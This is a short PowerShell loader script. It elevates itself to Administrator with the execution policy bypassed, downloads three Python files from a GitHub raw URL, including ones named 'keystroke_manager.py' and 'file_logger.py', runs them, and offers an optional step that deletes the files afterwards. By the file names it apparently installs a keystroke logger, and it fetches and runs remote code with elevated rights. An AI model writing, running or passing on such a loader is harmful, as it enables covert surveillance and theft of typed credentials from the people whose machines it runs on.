# Ensure the script is running as Administrator
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Define URLs for the Python scripts
$baseURL = "https://raw.githubusercontent.com/AsheshDev/kp/main/"
$scripts = @("main.py", "keystroke_manager.py", "file_logger.py")

# Download each Python script
foreach ($script in $scripts) {
    $url = $baseURL + $script
    $outputFile = $script
    Invoke-WebRequest -Uri $url -OutFile $outputFile
}

# Execute the main Python script
python .\main.py

# Optional: Uncomment the next line to remove scripts after execution
# Remove-Item -Path $scripts -Force
